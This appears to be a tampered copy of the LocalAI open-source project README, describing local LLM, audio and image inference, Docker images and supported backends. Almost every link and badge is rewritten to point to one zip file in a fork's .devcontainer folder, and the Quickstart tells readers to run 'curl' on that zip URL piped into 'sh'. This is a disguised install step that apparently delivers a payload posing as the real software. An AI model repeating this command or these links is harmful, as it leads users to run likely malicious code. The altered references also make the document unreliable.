<h1 align="center">
  <br>
  <img width="300" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> <br>
<br>
</h1>

<p align="center">
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI forks"/>
</a>
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI stars"/>
</a>
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI pull-requests"/>
</a>
<a href='https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip'>
<img src='https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip'>
</a>
</p>

<p align="center">
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI Docker hub"/>
</a>
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"/>
</a>
</p>

<p align="center">
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="Follow LocalAI_API"/>
</a>
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3A%2F%https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%2Fapi%2Finvites%2FuJAeKSAGDy%3Fwith_counts%3Dtrue&logo=discord" alt="Join LocalAI Discord Community"/>
</a>
</p>

<p align="center">
<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="mudler%2FLocalAI | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
</p>

> :bulb: Get help - [‚ùìFAQ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [üí≠Discussions](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [:speech_balloon: Discord](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [:book: Documentation website](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
>
> [üíª Quickstart](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [üñºÔ∏è Models](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [üöÄ Roadmap](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap) [üõ´ Examples](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) Try on 
[![Telegram](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

[![tests](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Build and Release](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![build container images](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Bump dependencies](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Artifact Hub](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

**LocalAI** is the free, Open Source OpenAI alternative. LocalAI act as a drop-in replacement REST API that's compatible with OpenAI (Elevenlabs, Anthropic... ) API specifications for local AI inferencing. It allows you to run LLMs, generate images, audio (and not only) locally or on-prem with consumer grade hardware, supporting multiple model families. Does not require GPU. It is created and maintained by [Ettore Di Giacinto](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).


## üìöüÜï Local Stack Family

üÜï LocalAI is now part of a comprehensive suite of AI tools designed to work together:

<table>
  <tr>
    <td width="50%" valign="top">
      <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
        <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" width="300" alt="LocalAGI Logo">
      </a>
    </td>
    <td width="50%" valign="top">
      <h3><a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">LocalAGI</a></h3>
      <p>A powerful Local AI agent management platform that serves as a drop-in replacement for OpenAI's Responses API, enhanced with advanced agentic capabilities.</p>
    </td>
  </tr>
  <tr>
    <td width="50%" valign="top">
      <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
        <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" width="300" alt="LocalRecall Logo">
      </a>
    </td>
    <td width="50%" valign="top">
      <h3><a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">LocalRecall</a></h3>
      <p>A REST-ful API and knowledge base management system that provides persistent memory and storage capabilities for AI agents.</p>
    </td>
  </tr>
</table>

## Screenshots / Video

### Youtube video

<h1 align="center">
  <br>
  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="_blank"> <img width="300" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> </a><br>
<br>
</h1>


### Screenshots

| Talk Interface | Generate Audio |
| --- | --- |
| ![Screenshot 2025-03-31 at 12-01-36 LocalAI - Talk](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-01-29 LocalAI - Generate audio with voice-en-us-ryan-low](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |

| Models Overview | Generate Images |
| --- | --- |
| ![Screenshot 2025-03-31 at 12-01-20 LocalAI - Models](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-31-41 LocalAI - Generate images with flux 1-dev](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |

| Chat Interface | Home |
| --- | --- |
| ![Screenshot 2025-03-31 at 11-57-44 LocalAI - Chat with localai-functioncall-qwen2 5-7b-v0 5](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 11-57-23 LocalAI API - c2a39e3 (c2a39e3639227cfd94ffffe9f5691239acc275a8)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |

| Login | Swarm |
| --- | --- |
|![Screenshot 2025-03-31 at 12-09-59 ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-10-39 LocalAI - P2P dashboard](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |

## üíª Quickstart

Run the installer script:

```bash
# Basic installation
curl https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip | sh
```

For more installation options, see [Installer Options](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).

### macOS Download:

<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
  <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="Download LocalAI for macOS"/>
</a>

> Note: the DMGs are not signed by Apple as quarantined. See https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip for a workaround, fix is tracked here: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Or run with docker:

> **üí° Docker Run vs Docker Start**
> 
> - `docker run` creates and starts a new container. If a container with the same name already exists, this command will fail.
> - `docker start` starts an existing container that was previously created with `docker run`.
> 
> If you've already run LocalAI before and want to start it again, use: `docker start -i local-ai`

### CPU only image:

```bash
docker run -ti --name local-ai -p 8080:8080 localai/localai:latest
```

### NVIDIA GPU Images:

```bash
# CUDA 13.0
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-gpu-nvidia-cuda-13

# CUDA 12.0
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-gpu-nvidia-cuda-12

# NVIDIA Jetson (L4T) ARM64
# CUDA 12 (for Nvidia AGX Orin and similar platforms)
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-nvidia-l4t-arm64

# CUDA 13 (for Nvidia DGX Spark)
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-nvidia-l4t-arm64-cuda-13
```

### AMD GPU Images (ROCm):

```bash
docker run -ti --name local-ai -p 8080:8080 --device=/dev/kfd --device=/dev/dri --group-add=video localai/localai:latest-gpu-hipblas
```

### Intel GPU Images (oneAPI):

```bash
docker run -ti --name local-ai -p 8080:8080 --device=/dev/dri/card1 --device=/dev/dri/renderD128 localai/localai:latest-gpu-intel
```

### Vulkan GPU Images:

```bash
docker run -ti --name local-ai -p 8080:8080 localai/localai:latest-gpu-vulkan
```

### AIO Images (pre-downloaded models):

```bash
# CPU version
docker run -ti --name local-ai -p 8080:8080 localai/localai:latest-aio-cpu

# NVIDIA CUDA 13 version
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-aio-gpu-nvidia-cuda-13

# NVIDIA CUDA 12 version
docker run -ti --name local-ai -p 8080:8080 --gpus all localai/localai:latest-aio-gpu-nvidia-cuda-12

# Intel GPU version
docker run -ti --name local-ai -p 8080:8080 localai/localai:latest-aio-gpu-intel

# AMD GPU version
docker run -ti --name local-ai -p 8080:8080 --device=/dev/kfd --device=/dev/dri --group-add=video localai/localai:latest-aio-gpu-hipblas
```

For more information about the AIO images and pre-downloaded models, see [Container Documentation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).

To load models:

```bash
# From the model gallery (see available models with `local-ai models list`, in the WebUI from the model tab, or visiting https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
local-ai run llama-3.2-1b-instruct:q4_k_m
# Start LocalAI with the phi-2 model directly from huggingface
local-ai run https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
# Install and run a model from the Ollama OCI registry
local-ai run ollama://gemma:2b
# Run a model from a configuration file
local-ai run https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
# Install and run a model from a standard OCI registry (e.g., Docker Hub)
local-ai run oci://localai/phi-2:latest
```

> ‚ö° **Automatic Backend Detection**: When you install models from the gallery or YAML files, LocalAI automatically detects your system's GPU capabilities (NVIDIA, AMD, Intel) and downloads the appropriate backend. For advanced configuration options, see [GPU Acceleration](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).

For more information, see [üíª Getting started](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), if you are interested in our roadmap items and future enhancements, you can see the [Issues labeled as Roadmap here](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap)

## üì∞ Latest project news

- December 2025: [Dynamic Memory Resource reclaimer](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), [Automatic fitting of models to multiple GPUS(https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), [Added Vibevoice backend](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- November 2025: Major improvements to the UX. Among these: [Import models via URL](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [Multiple chats and history](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- October 2025: üîå [Model Context Protocol (MCP)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) support added for agentic capabilities with external tools
- September 2025: New Launcher application for MacOS and Linux, extended support to many backends for Mac and Nvidia L4T devices. Models: Added MLX-Audio, WAN 2.2. WebUI improvements and Python-based backends now ships portable python environments.
- August 2025: MLX, MLX-VLM, Diffusers and https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip are now supported on Mac M1/M2/M3+ chips ( with `development` suffix in the gallery ): https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- July/August 2025: üîç [Object Detection](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) added to the API featuring [rf-detr](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- July 2025: All backends migrated outside of the main binary. LocalAI is now more lightweight, small, and automatically downloads the required backend to run the model. [Read the release notes](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- June 2025: [Backend management](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) has been added. Attention: extras images are going to be deprecated from the next release! Read [the backend management PR](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
- May 2025: [Audio input](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [Reranking](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) in https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend, [Realtime API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip),  Support to Gemma, SmollVLM, and more multimodal models (available in the gallery).
- May 2025: Important: image name changes [See release](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- Apr 2025: Rebrand, WebUI enhancements
- Apr 2025: [LocalAGI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [LocalRecall](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) join the LocalAI family stack.
- Apr 2025: WebUI overhaul, AIO images updates
- Feb 2025: Backend cleanup, Breaking changes, new backends (kokoro, OutelTTS, faster-whisper), Nvidia L4T images
- Jan 2025: LocalAI model release: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, SANA support in diffusers: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Dec 2024: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend (ggml) added ( https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip )
- Nov 2024: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend added ( https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip )
- Nov 2024: Voice activity detection models (**VAD**) added to the API: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Oct 2024: examples moved to [LocalAI-examples](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- Aug 2024:  üÜï FLUX-1, [P2P Explorer](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- July 2024: üî•üî• üÜï P2P Dashboard, LocalAI Federated mode and AI Swarms: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip P2P Global community pools: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- May 2024: üî•üî• Decentralized P2P https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip  https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip (peer2peer https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip!) üëâ Docs  https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- May 2024: üî•üî• Distributed inferencing: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- April 2024: Reranker API: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Roadmap items: [List of issues](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap)

## üöÄ [Features](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)

- üß© [Backend Gallery](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip): Install/remove backends on the fly, powered by OCI images ‚Äî fully customizable and API-driven.
- üìñ [Text generation with GPTs](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (`https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip`, `transformers`, `vllm` ... [:book: and more](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip))
- üó£ [Text to Audio](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üîà [Audio to Text](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (Audio transcription with `https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip`)
- üé® [Image generation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üî• [OpenAI-alike tools API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) 
- üß† [Embeddings generation for vector databases](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- ‚úçÔ∏è [Constrained grammars](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üñºÔ∏è [Download Models directly from Huggingface ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- ü•Ω [Vision API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üîç [Object Detection](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üìà [Reranker API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üÜïüñß [P2P Inferencing](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üÜïüîå [Model Context Protocol (MCP)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) - Agentic capabilities with external tools and [LocalAGI's Agentic capabilities](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- üîä Voice activity detection (Silero-VAD support)
- üåç Integrated WebUI!

## üß© Supported Backends & Acceleration

LocalAI supports a comprehensive range of AI backends with multiple acceleration options:

### Text Generation & Language Models
| Backend | Description | Acceleration Support |
|---------|-------------|---------------------|
| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | LLM inference in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, Metal, CPU |
| **vLLM** | Fast LLM inference with PagedAttention | CUDA 12/13, ROCm, Intel |
| **transformers** | HuggingFace transformers framework | CUDA 12/13, ROCm, Intel, CPU |
| **exllama2** | GPTQ inference library | CUDA 12/13 |
| **MLX** | Apple Silicon LLM inference | Metal (M1/M2/M3+) |
| **MLX-VLM** | Apple Silicon Vision-Language Models | Metal (M1/M2/M3+) |

### Audio & Speech Processing
| Backend | Description | Acceleration Support |
|---------|-------------|---------------------|
| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | OpenAI Whisper in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, CPU |
| **faster-whisper** | Fast Whisper with CTranslate2 | CUDA 12/13, ROCm, Intel, CPU |
| **bark** | Text-to-audio generation | CUDA 12/13, ROCm, Intel |
| **bark-cpp** | C++ implementation of Bark | CUDA, Metal, CPU |
| **coqui** | Advanced TTS with 1100+ languages | CUDA 12/13, ROCm, Intel, CPU |
| **kokoro** | Lightweight TTS model | CUDA 12/13, ROCm, Intel, CPU |
| **chatterbox** | Production-grade TTS | CUDA 12/13, CPU |
| **piper** | Fast neural TTS system | CPU |
| **kitten-tts** | Kitten TTS models | CPU |
| **silero-vad** | Voice Activity Detection | CPU |
| **neutts** | Text-to-speech with voice cloning | CUDA 12/13, ROCm, CPU |
| **vibevoice** | Real-time TTS with voice cloning | CUDA 12/13, ROCm, Intel, CPU |

### Image & Video Generation
| Backend | Description | Acceleration Support |
|---------|-------------|---------------------|
| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | Stable Diffusion in C/C++ | CUDA 12/13, Intel SYCL, Vulkan, CPU |
| **diffusers** | HuggingFace diffusion models | CUDA 12/13, ROCm, Intel, Metal, CPU |

### Specialized AI Tasks
| Backend | Description | Acceleration Support |
|---------|-------------|---------------------|
| **rfdetr** | Real-time object detection | CUDA 12/13, Intel, CPU |
| **rerankers** | Document reranking API | CUDA 12/13, ROCm, Intel, CPU |
| **local-store** | Vector database | CPU |
| **huggingface** | HuggingFace API integration | API-based |

### Hardware Acceleration Matrix

| Acceleration Type | Supported Backends | Hardware Support |
|-------------------|-------------------|------------------|
| **NVIDIA CUDA 12** | All CUDA-compatible backends | Nvidia hardware |
| **NVIDIA CUDA 13** | All CUDA-compatible backends | Nvidia hardware |
| **AMD ROCm** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, vllm, transformers, diffusers, rerankers, coqui, kokoro, bark, neutts, vibevoice | AMD Graphics |
| **Intel oneAPI** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, vllm, transformers, diffusers, rfdetr, rerankers, exllama2, coqui, kokoro, bark, vibevoice | Intel Arc, Intel iGPUs |
| **Apple Metal** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, diffusers, MLX, MLX-VLM, bark-cpp | Apple M1/M2/M3+ |
| **Vulkan** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion | Cross-platform GPUs |
| **NVIDIA Jetson (CUDA 12)** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (AGX Orin, etc.) |
| **NVIDIA Jetson (CUDA 13)** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (DGX Spark) |
| **CPU Optimized** | All backends | AVX/AVX2/AVX512, quantization support |

### üîó Community and integrations

Build and deploy custom containers:
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

WebUIs:
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- QA-Pilot(An interactive chat project that leverages LocalAI LLMs for rapid understanding and navigation of GitHub code repository) https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Agentic Libraries:
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

MCPs:
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Model galleries
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Voice:
- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip

Other:
- Helm chart https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- VSCode extension https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Langchain: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Terminal utility https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Local Smart assistant https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Home Assistant https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip / https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip / https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Discord bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Slack bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Shell-Pilot(Interact with LLM using LocalAI models via pure shell scripts on your Linux or MacOS system) https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Telegram bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Another Telegram Bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Auto-documentation https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Github bot which answer on issues, with code and documentation as context https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Github Actions: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
- Examples: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
  

### üîó Resources

- [LLM finetuning guide](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [How to build locally](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [How to install in Kubernetes](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
- [Projects integrating LocalAI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
